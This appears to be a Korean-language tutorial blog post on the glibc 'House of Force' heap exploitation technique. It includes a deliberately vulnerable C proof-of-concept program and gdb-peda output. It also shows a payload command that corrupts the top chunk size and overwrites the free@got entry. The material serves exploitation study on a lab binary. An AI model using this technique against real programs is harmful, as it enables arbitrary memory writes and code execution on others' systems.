---
title: House of Force
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, house of series]
math: true
mermaid: true
---

## Top Chunk

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc,char *argv[]){
    int size;
    char *buf1, *buf2, *buf3;
    
    buf1 = malloc(256);
    buf2 = malloc(256);
    buf3 = malloc(256);

    free(buf3);
    free(buf2);
    free(buf1);
}
```

일반적으로 heap 영역에 할당되는 0x21000에서 malloc하여 할당된 chunk size를 뺀 값이 top chunk의 크기이다.

```
0x21000 - 0x110(malloc) = 0x20ef0
0x20ef0 - 0x110(malloc) = 0x20de0
0x20de0 - 0x110(malloc) = 0x20cd0
```

top chunk는 재사용 가능한 chunk가 없고, top chunk의 크기가 요청 크기보다 작을 경우 top chunk에서 나눠서 할당을 해준다. top chunk에 인접한 chunk가 free되면 병합하는데 fastbin의 경우 병합에서 제외된다.

```
0x20cd0 + 0x110(free) = 0x20de0
0x20de0 + 0x110(free) = 0x20ef0
0x20ef0 + 0x110(free) = 0x21000
```

## Conditions

- 공격자에 의해 Top Chunk를 덮어쓸 수 있어야 함(0xffffffffffffffff)
- 공격자에 의해 할당되는 Heap 크기를 제어할 수 있어야 함
- 공격자에 의해 할당된 Chunk 영역에 값을 저장할 수 있어야 함

## Exploit plan

1. heap 영역 생성
2. top chunk 변조
3. 계산된 값을 malloc 인자 값으로 전달해 메모리를 할당
    - target address - allocated chunk header size(16 or 8) - top chunk address
4. 다시 malloc 호출
    - 공격자가 원하는 영역이 할당됨

## Proof of concept

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
 
int main(int argc, char *argv[])
{
        char *buf1, *buf2, *buf3;
        if (argc != 4) return;
 
        buf1 = malloc(256);
        strcpy(buf1, argv[1]);
 
        buf2 = malloc(strtoul(argv[2], NULL, 16));
 
        buf3 = malloc(256);
        strcpy(buf3, argv[3]);
 
        free(buf3);
        free(buf2);
        free(buf1);
 
        return 0;
}
```

argv1 overflow를 통해 top chunk를 0xffffffffffffffff로 변조한다.

```
gdb-peda$ heapbase
heapbase : 0x602000
gdb-peda$ x/24gx 0x602000
0x602000:   0x0000000000000000  0x0000000000000111
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x4141414141414141  0x4141414141414141
0x602030:   0x4141414141414141  0x4141414141414141
0x602040:   0x4141414141414141  0x4141414141414141
0x602050:   0x4141414141414141  0x4141414141414141
0x602060:   0x4141414141414141  0x4141414141414141
0x602070:   0x4141414141414141  0x4141414141414141
0x602080:   0x4141414141414141  0x4141414141414141
0x602090:   0x4141414141414141  0x4141414141414141
0x6020a0:   0x4141414141414141  0x4141414141414141
0x6020b0:   0x4141414141414141  0x4141414141414141
0x6020c0:   0x4141414141414141  0x4141414141414141
0x6020d0:   0x4141414141414141  0x4141414141414141
0x6020e0:   0x4141414141414141  0x4141414141414141
0x6020f0:   0x4141414141414141  0x4141414141414141
0x602100:   0x4141414141414141  0x4141414141414141
0x602110:   0x4141414141414141  0xffffffffffffffff <- Top Chunk
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                top: 0x602110 (size : 0xfffffffffffffff8) (top is broken ?) 
    last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
```

“free@got(0x601018)” - “Chunk header size(0x10)” - “Top chunk address(0x602118)” - 0x8 = 0xffffeee8

heap 영역은 0x*0 단위로 할당하기 때문에 -0x8을 하였다. argv2에 0xffffeee8을 입력하여 해당 크기만큼 malloc을 해준다. argv3에 BBBBBBBBCCCCCCCC를 입력하면 free@got가 변조된다.

```
gdb-peda$ r $(python -c 'print "A"*0x108+"\xff"*8') 0xffffffffffffeee8 BBBBBBBBCCCCCCCC
gdb-peda$ x/24gx 0x601018-0x10
0x601008:   0x0000000000000111  0x4242424242424242
0x601018:   0x4343434343434343  0x00007ffff7ab2900
0x601028:   0x00007ffff7a2d740  0x00007ffff7a91130
0x601038:   0x00007ffff7a483f0  0x0000000000000000
```

## References
- [The House of Force](https://www.lazenca.net/display/TEC/The+House+of+Force)
- [What is heap part1](https://hackstoryadmin.tistory.com/entry/What-is-heap-part1)